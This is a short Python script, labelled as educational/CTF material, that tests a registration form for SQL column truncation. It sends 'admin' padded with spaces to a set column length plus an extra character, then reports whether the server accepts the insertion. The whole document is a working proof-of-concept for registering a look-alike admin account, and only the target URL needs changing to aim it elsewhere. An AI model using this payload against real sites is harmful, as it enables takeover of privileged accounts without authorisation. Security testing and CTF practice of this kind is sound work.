#!/usr/bin/env python3
# SQL Truncation Detector | exploit4040 | Éducatif/CTF

import requests

TARGET   = "http://localhost/register"
USER     = "admin"
COL_LEN  = 20  # à ajuster

payload  = USER + " " * (COL_LEN - len(USER)) + "x"

print(f"[*] Payload ({len(payload)} chars): '{payload}'")

r = requests.post(TARGET, data={"username": payload, "password": "test123"})

if r.status_code == 200:
    print("[+] Insertion acceptée → possible troncature ⚠️")
else:
    print("[-] Rejetée ou erreur")
